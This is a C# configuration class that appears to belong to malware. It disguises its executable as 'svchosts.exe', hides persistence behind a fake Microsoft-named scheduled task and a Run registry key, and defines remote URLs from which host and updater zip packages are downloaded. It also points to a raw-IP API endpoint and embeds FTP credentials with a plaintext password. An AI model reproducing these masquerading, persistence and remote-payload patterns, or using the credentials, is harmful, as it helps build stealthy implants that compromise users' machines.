using System;
using System.IO;
using System.Reflection;

namespace Mandrega.Common
{
    public class FtpCredentials
    {
        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }
    }

    public class StaticConfiguration
    {
        private readonly bool _isLive;

        private StaticConfiguration(bool isLive)
        {
            _isLive = isLive;
        }

        public string HostDataCachePath => Path.Combine(RootInstallPath, "userdata.dat");
        public string WindowsTaskName = "MicrosoftUpdaterServiceCore_{D9D4CFB6-E0DB-46DB-B2D4-AC9E4D82F3E3}";
        public string HostExeName => "svchosts.exe";
        public string UpdaterExeName => "System.Runtime.Updater.exe";
        public string RegistryKeyName => "Microsoft.Net.Hosts";
        public string RegistryKeyPath => "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        public string RootInstallPath => _isLive
            ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Network")
            : new FileInfo(Assembly.GetExecutingAssembly().Location).DirectoryName;
        public string CustomInstallPath(string friendlyAppName) => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), friendlyAppName);
        public string ApiUrl => GetApiUrl();
        public string DriveRemoteUrl => @"http://fuzzy.altervista.org";
        public string VersionCheckingUrl => $"{DriveRemoteUrl}/version";
        public string HostZipRemoteUrl => $"{DriveRemoteUrl}/host-installer.zip";
        public string GetHostInstallFolder(string rootInstallPath) => Path.Combine(rootInstallPath, "host");
        public string HostInstallFolder => GetHostInstallFolder(RootInstallPath);
        public string UpdaterInstallFolder => RootInstallPath;
        public string GetHostExePath(string rootPath) => Path.Combine(GetHostInstallFolder(rootPath), HostExeName);
        public string HostExePath => GetHostExePath(RootInstallPath);
        public string HostZipName => "host.zip";
        public string HostZipPath => Path.Combine(GetHostInstallFolder(RootInstallPath), HostZipName);
        public string UpdaterZipRemoteUrl => $"{DriveRemoteUrl}/updater-installer.zip";
        public string GetUpdaterExePath(string rootPath) => Path.Combine(rootPath, UpdaterExeName);
        public string UpdaterExePath => GetUpdaterExePath(RootInstallPath);
        public string UpdaterZipPath => Path.Combine(RootInstallPath, "updater.zip");

        public FtpCredentials FtpCredentials => new FtpCredentials
        {
            url = "ftp://fuzzy.altervista.org",
            username = "fuzzy",
            password = "5P2vPy9ELSZeEMq"
        };

        private string GetApiUrl()
        {
            return _isLive ? @"http://79.9.2.47:5000" : @"http://localhost:9000";
        }

        public string GetHostDllCompletePath()
        {
            return Path.Combine(GetHostInstallFolder(RootInstallPath), $"{HostExeName.Replace("exe", "dll")}");
        }

        public string GetFriendlyAppName(string applicationName)
        {
            var index = applicationName.LastIndexOf(".", StringComparison.CurrentCultureIgnoreCase);
            return index != -1 ? applicationName.Substring(0, index) : applicationName;
        }

        public string GetFriendlyAppUrl(string friendlyName)
        {
            return $"{DriveRemoteUrl}/{friendlyName}";
        }

        public static StaticConfiguration GetCurrentConfiguration()
        {
            return new StaticConfiguration(true);
        }
    }
}
